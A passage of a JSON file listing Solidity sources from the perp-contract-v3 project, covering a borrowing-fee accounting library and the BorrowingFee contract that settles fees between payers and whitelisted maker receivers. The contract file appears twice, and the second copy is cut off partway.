/// payerFeeGrowthGlobal: how much fee payer pays per payerâ€™s openNotional since beginning.\n    /// @dev\n    /// receiverFeeGrowthGlobal = oldFeeGrowthGlobal + delta ( growth means it always accumulate the delta )\n    /// receiverFeeGrowthDelta = totalPayerFeeSinceLastUpdated / totalReceiverOpenNotional\n    /// payerFeeGrowthGlobal = oldFeeGrowthGlobal + delta ( growth means it always accumulate the delta )\n    function settleFeeGrowthGlobal(BorrowingFeeState storage self) internal {\n        if (self.feeGrowthGlobal.secondsSinceLastUpdated() == 0) {\n            return;\n        }\n        uint256 payerFeeGrowthDelta = self.getPayerFeeGrowthGlobalDelta();\n        uint256 receiverFeeGrowthDelta = self.getReceiverFeeGrowthGlobalDelta();\n        self.feeGrowthGlobal.increment(payerFeeGrowthDelta, receiverFeeGrowthDelta);\n    }\n\n    /// @dev the formula of \"payerFeeGrowthGlobal\" contains this state, so it must be settled before this is changed\n    function setMaxBorrowingFeeRate(BorrowingFeeState storage self, uint256 newMaxBorrowingFeeRate) internal {\n        self.settleFeeGrowthGlobal();\n        self.maxBorrowingFeeRate = newMaxBorrowingFeeRate;\n    }\n\n    function syncPayerFeeGrowth(BorrowingFeeState storage self, address payer) internal {\n        self.payerFeeGrowthMap[payer] = self.feeGrowthGlobal.payer;\n    }\n\n    function syncReceiverFeeGrowth(BorrowingFeeState storage self, address receiver) internal {\n        self.receiverFeeGrowthMap[receiver] = self.feeGrowthGlobal.receiver;\n    }\n\n    //\n    // INTERNAL VIEW\n    //\n\n    /// @notice calculate how much payer fee growth global should increment since last updated\n    /// @dev feeGrowthGlobal = oldFeeGrowthGlobal + delta ( growth means it always accumulate the delta )\n    /// delta = maxBorrowingFeeRate * utilRatio * period, multiplied by WAD\n    /// (multiply by WAD to minimize rounding error)\n    function getPayerFeeGrowthGlobalDelta(BorrowingFeeState storage self) internal view returns (uint256) {\n        // incrementalFeeGrowth = borrowingFeeRate * period\n        // borrowingFeeRate = utilRatio * maxBorrowingFeeRate\n        uint256 utilRatio = self.utilRatio;\n        if (utilRatio > WAD) {\n            revert LibError.InvalidRatio(utilRatio);\n        }\n\n        uint256 secondsSinceLastUpdated = self.feeGrowthGlobal.secondsSinceLastUpdated();\n        if (secondsSinceLastUpdated == 0) {\n            return 0;\n        }\n\n        // normally, utilRatio * maxBorrowingFeeRate should divide by WAD again, but the result we're returning\n        // are also multiplied by WAD so we skip this divide\n        return self.maxBorrowingFeeRate * secondsSinceLastUpdated * utilRatio;\n    }\n\n    /// @notice calculate how much receiver fee growth global should increment since last updated\n    /// @dev feeGrowthGlobal = oldFeeGrowthGlobal + delta ( growth means it always accumulate the delta )\n    /// delta = totalPayerFeeSinceLastUpdated / totalReceiverOpenNotional, multiplied by WAD\n    /// (multiply by WAD to minimize rounding error)\n    function getReceiverFeeGrowthGlobalDelta(BorrowingFeeState storage self) internal view returns (uint256) {\n        uint256 totalReceiverOpenNotional = self.totalReceiverOpenNotional;\n        if (totalReceiverOpenNotional == 0) {\n            return 0;\n        }\n\n        // borrowingFee per second per totalAbsOpenNotional = max rate * global util ratio\n        // total payerFee per second = above * totalAbsOpenNotional\n        // total payerFee incremented during this period = above * period\n        // total payerFee per total receiver's open notional during this period = above / sum(receiverOpenNotional)\n        //\n        // normally, utilRatio * totalOpenNotional should divide by WAD again, but the result we're returning\n        // are also multiplied by WAD so we skip this divide\n        return\n            (self.maxBorrowingFeeRate *\n                self.utilRatio *\n                self.feeGrowthGlobal.secondsSinceLastUpdated() *\n                self.totalPayerOpenNotional) / totalReceiverOpenNotional;\n    }\n\n    /// @dev caller must ensure it's payer\n    function getPendingPayerFee(\n        BorrowingFeeState storage self,\n        address payer,\n        uint256 payerOpenNotionalAbs\n    ) internal view returns (int256) {\n        // how to calculate feeGrowthDelta:\n        // 1. get fee growth global delta since last updated\n        // 2. get local fee growth from payerMap (it's the growth global stored when payer updated last time)\n        // 3. calculate the difference\n        uint256 oldFeeGrowthGlobal = self.feeGrowthGlobal.payer;\n        uint256 feeGrowthGlobalDelta = self.getPayerFeeGrowthGlobalDelta();\n        uint256 newFeeGrowthGlobal = oldFeeGrowthGlobal + feeGrowthGlobalDelta;\n        uint256 feeGrowthLocal = self.payerFeeGrowthMap[payer];\n        // payer always pay, fee is always growing, global is always later than local, hence feeGrowthGlobal is always\n        // greater than or equals to feeGrowthLocal\n        uint256 feeGrowthLocalDelta = newFeeGrowthGlobal - feeGrowthLocal;\n        if (feeGrowthLocalDelta == 0) {\n            return 0;\n        }\n\n        // pendingPayerFee = feeGrowthLocalDelta * payerOpenNotional\n        // feeGrowthLocalDelta is multiplied by WAD by definition\n        // so besides dividing WAD during multiplying with receiverOpenNotionalAbs, we divide WAD once more\n        uint256 pendingPayerFee = feeGrowthLocalDelta.mulWad(payerOpenNotionalAbs) / WAD;\n        return pendingPayerFee.toInt256();\n    }\n\n    /// @dev caller must ensure it's receiver.\n    /// @notice basic version:\n    /// totalPayerLongBorrowingFee = longUtilRatio * maxBorrowingFeeRate * deltaTime * totalPayerLongOpenNotionalAbs\n    /// receiverLongWeight = receiverStatsLong.openNotional / totalReceiverOpenNotionalLong\n    /// receiverLongBorrowingFee = totalLongBorrowingFee * receiverLongWeight\n    ///                          = (longUtilRatio * maxBorrowingFeeRate * deltaTime * totalPayerLongOpenNotionalAbs)\n    ///                             * (receiverStatsLong.openNotional / totalReceiverOpenNotionalLongAbs)\n    /// receiverBorrowingFee = -(receiverLongBorrowingFee + receiverShortBorrowingFee)\n    function getPendingReceiverFee(\n        BorrowingFeeState storage self,\n        address receiver,\n        uint256 openNotionalAbs\n    ) internal view returns (int256) {\n        // calc incremental receiver fee growth for both long and short\n        uint256 oldFeeGrowthGlobal = self.feeGrowthGlobal.receiver;\n        uint256 feeGrowthGlobalDelta = self.getReceiverFeeGrowthGlobalDelta();\n        uint256 newFeeGrowthGlobal = oldFeeGrowthGlobal + feeGrowthGlobalDelta;\n        uint256 feeGrowthLocal = self.receiverFeeGrowthMap[receiver];\n        uint256 feeGrowthLocalDelta = newFeeGrowthGlobal - feeGrowthLocal;\n        if (feeGrowthLocalDelta == 0) {\n            return 0;\n        }\n\n        // receiver feeGrowth is fee per openNotional\n        // receiver always receive borrowing fee, that means receiver fee is negative\n        // feeGrowthLocalDelta is multiplied by WAD by definition\n        // so besides dividing WAD during multiplying with openNotionalAbs, we divide WAD once more\n        uint256 receiverFee = openNotionalAbs.mulWad(feeGrowthLocalDelta) / WAD;\n        return -(receiverFee).toInt256();\n    }\n}"
    },
    {
      "filename": "perp-contract-v3/src/borrowingFee/BorrowingFee.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport { SafeCast } from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\nimport { IAddressManager } from \"../addressManager/IAddressManager.sol\";\nimport { AddressResolverUpgradeable } from \"../addressResolver/AddressResolverUpgradeable.sol\";\nimport { LibAddressResolver } from \"../addressResolver/LibAddressResolver.sol\";\nimport { LibError } from \"../common/LibError.sol\";\nimport { LibPosition } from \"../vault/LibPosition.sol\";\nimport { Config } from \"../config/Config.sol\";\nimport { IVault } from \"../vault/IVault.sol\";\nimport { IBorrowingFee } from \"./IBorrowingFee.sol\";\nimport { BorrowingFeeModel } from \"./BorrowingFeeModel.sol\";\n\n/// @notice There's two roles of trader:\n/// - maker: trader who guarantee to provide passive liquidity\n/// - taker: trader who take that liquidity.\n/// if a certain type of maker qualify some of the criteria (will list after), the system will compensate the\n/// liquidity providers by letting other trader paying them borrowing fee. we'll separate them as \"payer\" and \"receiver\"\n///\n/// @notice There are also two roles when it comes to borrowing fee:\n/// - receiver: a subset of maker. cannot increase position proactively. cannot censor order in all conditions.\n/// - payer: every non-receiver is payer. it could be taker or maker.\n///\n/// @notice BorrowingFee per seconds = abs(openNotional) * utilRatio * maxBorrowingFeeRate\n/// borrowing fee of long and short position are separated. unlike traditional funding rate based on position size,\n/// borrowing fee rate is based on open notional.\n/// example: given maxBorrowingFeeRate is 10%, there's only 1 receiver with 2 margin. when trader increase 1 long with\n/// a receiver when openNotional is 1, if utilRatio = 50%, BorrowingFeeRate = abs(-1) * 0.5 * 0.1 = 0.05 = 5%\ncontract BorrowingFee is IBorrowingFee, BorrowingFeeModel, AddressResolverUpgradeable {\n    using LibAddressResolver for IAddressManager;\n    using SafeCast for uint256;\n    using SignedMath for int256;\n\n    //\n    // STRUCT\n    //\n\n    struct SettleBorrowingFeeParams {\n        uint256 marketId;\n        address trader;\n        int256 positionSizeDelta;\n        int256 openNotionalDelta;\n    }\n\n    //\n    // MODIFIER\n    //\n    modifier onlyVault() {\n        if (msg.sender != address(getAddressManager().getVault())) revert LibError.Unauthorized();\n        _;\n    }\n\n    modifier requireTakerIsPayer(uint256 marketId, address taker) {\n        if (_isReceiver(marketId, taker)) {\n            revert LibError.InvalidTaker(taker);\n        }\n        _;\n    }\n\n    //\n    // INIT\n    //\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address addressManager) external initializer {\n        __AddressResolver_init(addressManager);\n        __BorrowingFeeModel_init();\n    }\n\n    //\n    // EXTERNAL\n    //\n\n    /// @inheritdoc IBorrowingFee\n    function setMaxBorrowingFeeRate(\n        uint256 marketId,\n        uint256 maxLongBorrowingFeeRate,\n        uint256 maxShortBorrowingFeeRate\n    ) external override {\n        if (msg.sender != address(getAddressManager().getConfig())) revert LibError.Unauthorized();\n        _setMaxBorrowingFeeRate(marketId, maxLongBorrowingFeeRate, maxShortBorrowingFeeRate);\n    }\n\n    /// @dev settle receiver's borrowing fee right before they update margin. won't need to update if it's payer\n    /// @inheritdoc IBorrowingFee\n    function beforeUpdateMargin(uint256 marketId, address trader) external override onlyVault returns (int256) {\n        if (_isReceiver(marketId, trader)) {\n            _settleFeeGrowthGlobal(marketId);\n            return _settleReceiver(marketId, trader);\n        }\n        return 0;\n    }\n\n    /// @dev must be called if beforeUpdateMargin is called. update util ratio if it's receiver right after they mutated\n    /// the margin. won't need to update if it's payer\n    /// @inheritdoc IBorrowingFee\n    function afterUpdateMargin(uint256 marketId, address trader) external override onlyVault {\n        if (_isReceiver(marketId, trader)) {\n            _updateUtilRatio(marketId, trader);\n        }\n    }\n\n    /// @dev if every trader settled at the same time, sum of settledFee between payer/receiver is equaled\n    /// @inheritdoc IBorrowingFee\n    function beforeSettlePosition(\n        uint256 marketId,\n        address taker,\n        address maker,\n        int256 takerPositionSizeDelta,\n        int256 takerOpenNotionalDelta\n    ) external override onlyVault requireTakerIsPayer(marketId, taker) returns (int256, int256) {\n        // posSize delta & openNotional delta must have different sign\n        if (takerPositionSizeDelta * takerOpenNotionalDelta > 0) revert LibError.InvalidPosition();\n\n        // if taker trade against itself, settling twice on the same trader will cause issue\n        // since we depends on the same previous state. So we just simply skip it since all the global\n        // states should be the same after the trade\n        if (taker == maker) {\n            return (0, 0);\n        }\n\n        _settleFeeGrowthGlobal(marketId);\n\n        int256 takerBorrowingFee = _settleBorrowingFee(\n            SettleBorrowingFeeParams({\n                marketId: marketId,\n                trader: taker,\n                positionSizeDelta: takerPositionSizeDelta,\n                openNotionalDelta: takerOpenNotionalDelta\n            })\n        );\n        int256 makerBorrowingFee = _settleBorrowingFee(\n            SettleBorrowingFeeParams({\n                marketId: marketId,\n                trader: maker,\n                positionSizeDelta: -takerPositionSizeDelta,\n                openNotionalDelta: -takerOpenNotionalDelta\n            })\n        );\n\n        return (takerBorrowingFee, makerBorrowingFee);\n    }\n\n    /// @dev must be called if beforeSettle is called\n    /// @inheritdoc IBorrowingFee\n    function afterSettlePosition(uint256 marketId, address maker) external override onlyVault {\n        // according to `checkTrader`, only maker could be receiver\n        // update local util ratio of that participated receiver\n        if (_isReceiver(marketId, maker)) {\n            _updateUtilRatio(marketId, maker);\n        }\n    }\n\n    //\n    // EXTERNAL VIEW\n    //\n\n    /// @inheritdoc IBorrowingFee\n    function getPendingFee(uint256 marketId, address trader) external view override returns (int256) {\n        if (_isReceiver(marketId, trader)) {\n            return _getPendingReceiverFee(marketId, trader);\n        }\n        return _getPendingPayerFee(marketId, trader);\n    }\n\n    /// @inheritdoc IBorrowingFee\n    function getMaxBorrowingFeeRate(uint256 marketId) external view override returns (uint256, uint256) {\n        return _getMaxBorrowingFeeRate(marketId);\n    }\n\n    function getTotalReceiverOpenNotional(uint256 marketId) external view returns (uint256, uint256) {\n        return _getTotalReceiverOpenNotional(marketId);\n    }\n\n    function getTotalPayerOpenNotional(uint256 marketId) external view returns (uint256, uint256) {\n        return _getTotalPayerOpenNotional(marketId);\n    }\n\n    function getUtilRatio(uint256 marketId) external view returns (uint256, uint256) {\n        return _getUtilRatio(marketId);\n    }\n\n    //\n    // INTERNAL\n    //\n    function _settleBorrowingFee(SettleBorrowingFeeParams memory params) internal returns (int256) {\n        IVault vault = _getVault();\n        int256 oldOpenNotional = vault.getOpenNotional(params.marketId, params.trader);\n        int256 oldPositionSize = vault.getPositionSize(params.marketId, params.trader);\n        bool isUpdatingLong = (oldPositionSize == 0 && params.positionSizeDelta > 0) || oldPositionSize > 0;\n        bool isReceiver = _isReceiver(params.marketId, params.trader);\n\n        if (LibPosition.isIncreasing(oldPositionSize, params.positionSizeDelta)) {\n            return\n                _settleTrader(\n                    SettleTraderParams({\n                        marketId: params.marketId,\n                        trader: params.trader,\n                        isUpdatingLong: isUpdatingLong,\n                        openNotionalDelta: params.openNotionalDelta.abs().toInt256(),\n                        isReceiver: isReceiver\n                    })\n                );\n        }\n\n        // openNotionalDelta and oldOpenNotional have different signs\n        // check if it's reduce or close by comparing absolute position size\n        // if reduce\n        // realizedPnl = oldOpenNotional * closedRatio + openNotionalDelta\n        // closedRatio = positionSizeDeltaAbs / positionSizeAbs\n        // if close and increase reverse position\n        // realizedPnl = oldOpenNotional + openNotionalDelta * closedPositionSize / positionSizeDelta\n        uint256 positionSizeDeltaAbs = params.positionSizeDelta.abs();\n        uint256 positionSizeAbs = oldPositionSize.abs();\n        if (positionSizeAbs >= positionSizeDeltaAbs) {\n            // reduce or close position\n            // In order to avoid inconsistent rounding error, we must calculate reducedOpenNotional\n            // using exactly the same formula as in LibVault.addPosition().\n            // When reducing position, since the new account openNotional is calculate as such (refer to the codes in LibVault.addPosition()):\n            // newAccountOpenNotional = oldAccountOpenNotional + params.openNotionalDelta - realizedPnl\n            //                        = oldAccountOpenNotional + params.openNotionalDelta - (reducedOpenNotional + params.openNotionalDelta)\n            //                        = oldAccountOpenNotional + params.openNotionalDelta - ((openNotional * positionSizeDeltaAbs.toInt256()) / positionSizeAbs.toInt256() + params.openNotionalDelta)\n            //                        = oldAccountOpenNotional - (openNotional * positionSizeDeltaAbs.toInt256()) / positionSizeAbs.toInt256()\n            // Therefore, we want to make sure reducedOpenNotional = (openNotional * positionSizeDeltaAbs.toInt256()) / positionSizeAbs.toInt256()\n            int256 reducedOpenNotional = (oldOpenNotional * positionSizeDeltaAbs.toInt256()) /\n                positionSizeAbs.toInt256();\n            return\n                _settleTrader(\n                    SettleTraderParams({\n                        marketId: params.marketId,\n                        trader: params.trader,\n                        isUpdatingLong: isUpdatingLong,\n                        openNotionalDelta: -reducedOpenNotional.abs().toInt256(),\n                        isReceiver: isReceiver\n                    })\n                );\n        }\n\n        // reverse position. close 100% first\n        int256 borrowingFee = _settleTrader(\n            SettleTraderParams({\n                marketId: params.marketId,\n                trader: params.trader,\n                isUpdatingLong: isUpdatingLong,\n                openNotionalDelta: -oldOpenNotional.abs().toInt256(),\n                isReceiver: isReceiver\n            })\n        );\n\n        // In order to avoid inconsistent rounding error, we must calculate remainingOpenNotionalDelta\n        // using exactly the same formula as in LibVault.addPosition().\n        // When reversing position, since the new account openNotional is calculate as such (refer to the codes in LibVault.addPosition()):\n        //        newOpenNotional = position.oldOpenNotional + params.openNotionalDelta - realizedPnl\n        //                        = position.oldOpenNotional + params.openNotionalDelta - (position.oldOpenNotional + params.openNotionalDelta * positionSizeAbs / positionSizeDeltaAbs)\n        //                        = params.openNotionalDelta - params.openNotionalDelta * positionSizeAbs / positionSizeDeltaAbs\n        // Therefore, we want to make sure remainingOpenNotionalDelta = abs(newOpenNotional)\n        //                                                            = params.openNotionalDelta - params.openNotionalDelta * positionSizeAbs / positionSizeDeltaAbs\n        uint256 remainingOpenNotionalDelta = (params.openNotionalDelta -\n            (params.openNotionalDelta * positionSizeAbs.toInt256()) /\n            positionSizeDeltaAbs.toInt256()).abs();\n        borrowingFee += _settleTrader(\n            SettleTraderParams({\n                marketId: params.marketId,\n                trader: params.trader,\n                isUpdatingLong: !isUpdatingLong,\n                openNotionalDelta: remainingOpenNotionalDelta.toInt256(),\n                isReceiver: isReceiver\n            })\n        );\n\n        return borrowingFee;\n    }\n\n    //\n    // INTERNAL VIEW\n    //\n\n    function _getVault() internal view returns (IVault) {\n        return getAddressManager().getVault();\n    }\n\n    /// @inheritdoc BorrowingFeeModel\n    function _getOpenNotional(uint256 marketId, address payer) internal view override returns (int256) {\n        return _getVault().getOpenNotional(marketId, payer);\n    }\n\n    /// @inheritdoc BorrowingFeeModel\n    function _getUtilRatioFactor(uint256 marketId, address receiver) internal view override returns (uint256, uint256) {\n        return getAddressManager().getMakerReporter().getUtilRatioFactor(marketId, receiver);\n    }\n\n    /// @notice every trader must be either borrowing fee payer or receiver\n    function _isReceiver(uint256 marketId, address trader) internal view returns (bool) {\n        return getAddressManager().getConfig().isWhitelistedMaker(marketId, trader);\n    }\n}"
    },
    {
      "filename": "perp-contract-v3/src/borrowingFee/BorrowingFee.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport { SafeCast } from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\nimport { IAddressManager } from \"../addressManager/IAddressManager.sol\";\nimport { AddressResolverUpgradeable } from \"../addressResolver/AddressResolverUpgradeable.sol\";\nimport { LibAddressResolver } from \"../addressResolver/LibAddressResolver.sol\";\nimport { LibError } from \"../common/LibError.sol\";\nimport { LibPosition } from \"../vault/LibPosition.sol\";\nimport { Config } from \"../config/Config.sol\";\nimport { IVault } from \"../vault/IVault.sol\";\nimport { IBorrowingFee } from \"./IBorrowingFee.sol\";\nimport { BorrowingFeeModel } from \"./BorrowingFeeModel.sol\";\n\n/// @notice There's two roles of trader:\n/// - maker: trader who guarantee to provide passive liquidity\n/// - taker: trader who take that liquidity.\n/// if a certain type of maker qualify some of the criteria (will list after), the system will compensate the\n/// liquidity providers by letting other trader paying them borrowing fee. we'll separate them as \"payer\" and \"receiver\"\n///\n/// @notice There are also two roles when it comes to borrowing fee:\n/// - receiver: a subset of maker. cannot increase position proactively. cannot censor order in all conditions.\n/// - payer: every non-receiver is payer. it could be taker or maker.\n///\n/// @notice BorrowingFee per seconds = abs(openNotional) * utilRatio * maxBorrowingFeeRate\n/// borrowing fee of long and short position are separated. unlike traditional funding rate based on position size,\n/// borrowing fee rate is based on open notional.\n/// example: given maxBorrowingFeeRate is 10%, there's only 1 receiver with 2 margin. when trader increase 1 long with\n/// a receiver when openNotional is 1, if utilRatio = 50%, BorrowingFeeRate = abs(-1) * 0.5 * 0.1 = 0.05 = 5%\ncontract BorrowingFee is IBorrowingFee, BorrowingFeeModel, AddressResolverUpgradeable {\n    using LibAddressResolver for IAddressManager;\n    using SafeCast for uint256;\n    using SignedMath for int256;\n\n    //\n    // STRUCT\n    //\n\n    struct SettleBorrowingFeeParams {\n        uint256 marketId;\n        address trader;\n        int256 positionSizeDelta;\n        int256 openNotionalDelta;\n    }\n\n    //\n    // MODIFIER\n    //\n    modifier onlyVault() {\n        if (msg.sender != address(getAddressManager().getVault())) revert LibError.Unauthorized();\n        _;\n    }\n\n    modifier requireTakerIsPayer(uint256 marketId, address taker) {\n        if (_isReceiver(marketId, taker)) {\n            revert LibError.InvalidTaker(taker);\n        }\n        _;\n    }\n\n    //\n    // INIT\n    //\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address addressManager) external initializer {\n        __AddressResolver_init(addressManager);\n        __BorrowingFeeModel_init();\n    }\n\n    //\n    // EXTERNAL\n    //\n\n    /// @inheritdoc IBorrowingFee\n    function setMaxBorrowingFeeRate(\n        uint256 marketId,\n        uint256 maxLongBorrowingFeeRate,\n        uint256 maxShortBorrowingFeeRate\n    ) external override {\n        if (msg.sender != address(getAddressManager().getConfig())) revert LibError.Unauthorized();\n        _setMaxBorrowingFeeRate(marketId, maxLongBorrowingFeeRate, maxShortBorrowingFeeRate);\n    }\n\n    /// @dev settle receiver's borrowing fee right before they update margin. won't need to update if it's payer\n    /// @inheritdoc IBorrowingFee\n    function beforeUpdateMargin(uint256 marketId, address trader) external override onlyVault returns (int256) {\n        if (_isReceiver(marketId, trader)) {\n            _settleFeeGrowthGlobal(marketId);\n            return _settleReceiver(marketId, trader);\n        }\n        return 0;\n    }\n\n    /// @dev must be called if beforeUpdateMargin is called. update util ratio if it's receiver right after they mutated\n    /// the margin. won't need to update if it's payer\n    /// @inheritdoc IBorrowingFee\n    function afterUpdateMargin(uint256 marketId, address trader) external override onlyVault {\n        if (_isReceiver(marketId, trader)) {\n            _updateUtilRatio(marketId, trader);\n        }\n    }\n\n    /// @dev if every trader settled at the same time, sum of settledFee between payer/receiver is equaled\n    /// @inheritdoc IBorrowingFee\n    function beforeSettlePosition(\n        uint256 marketId,\n        address taker,\n        address maker,\n        int256 takerPositionSizeDelta,\n        int256 takerOpenNotionalDelta\n    ) external override onlyVault requireTakerIsPayer(marketId, taker) returns (int256, int256) {\n        // posSize delta & openNotional delta must have different sign\n        if (takerPositionSizeDelta * takerOpenNotionalDelta > 0) revert LibError.InvalidPosition();\n\n        // if taker trade against itself, settling twice on the same trader will cause issue\n        // since we depends on the same previous state. So we just simply skip it since all the global\n        // states should be the same after the trade\n        if (taker == maker) {\n            return (0, 0);\n        }\n\n        _settleFeeGrowthGlobal(marketId);\n\n        int256 takerBorrowingFee = _settleBorrowingFee(\n            SettleBorrowingFeeParams({\n                marketId: marketId,\n                trader: taker,\n                positionSizeDelta: takerPositionSizeDelta,\n                openNotionalDelta: takerOpenNotionalDelta\n            })\n        );\n        int256 makerBorrowingFee = _settleBorrowingFee(\n            SettleBorrowingFeeParams({\n                marketId: marketId,\n                trader: maker,\n                positionSizeDelta: -takerPositionSizeDelta,\n                openNotionalDelta: -takerOpenNotionalDelta\n            })\n        );\n\n        return (takerBorrowingFee, makerBorrowingFee);\n    }\n\n    /// @dev must be called if beforeSettle is called\n    /// @inheritdoc IBorrowingFee\n    function afterSettlePosition(uint256 marketId, address maker) external override onlyVault {\n        // according to `checkTrader`, only maker could be receiver\n        // update local util ratio of that participated receiver\n        if (_isReceiver(marketId, maker)) {\n            _updateUtilRatio(marketId, maker);\n        }\n    }\n\n    //\n    // EXTERNAL VIEW\n    //\n\n    /// @inheritdoc IBorrowingFee\n    function getPendingFee(uint256 marketId, address trader) external view override returns (int256) {\n        if (_isReceiver(marketId, trader)) {\n            return _getPendingReceiverFee(marketId, trader);\n        }\n        return _getPendingPayerFee(marketId, trader);\n    }\n\n    /// @inheritdoc IBorrowingFee\n    function getMaxBorrowingFeeRate(uint256 marketId) external view override returns (uint256, uint256) {\n        return _getMaxBorrowingFeeRate(marketId);\n    }\n\n    function getTotalReceiverOpenNotional(uint256 marketId) external view returns (uint256, uint256) {\n        return _getTotalReceiverOpenNotional(marketId);\n    }\n\n    function getTotalPayerOpenNotional(uint256 marketId) external view returns (uint256, uint256) {\n        return _getTotalPayerOpenNotional(marketId);\n    }\n\n    function getUtilRatio(uint256 marketId) external view returns (uint256, uint256) {\n        return _getUtilRatio(marketId);\n    }\n\n    //\n    // INTERNAL\n    //\n    function _settleBorrowingFee(SettleBorrowingFeeParams memory params) internal returns (int256) {\n        IVault vault = _getVault();\n        int256 oldOpenNotional = vault.getOpenNotional(params.marketId, params.trader);\n        int256 oldPositionSize = vault.getPositionSize(params.marketId, params.trader);\n        bool isUpdatingLong = (oldPositionSize == 0 && params.positionSizeDelta > 0) || oldPositionSize > 0;\n        bool isReceiver = _isReceiver(params.marketId, params.trader);\n\n        if (LibPosition.isIncreasing(oldPositionSize, params.positionSizeDelta)) {\n            return\n                _settleTrader(\n                    SettleTraderParams({\n                        marketId: params.marketId"
    }
  ]
}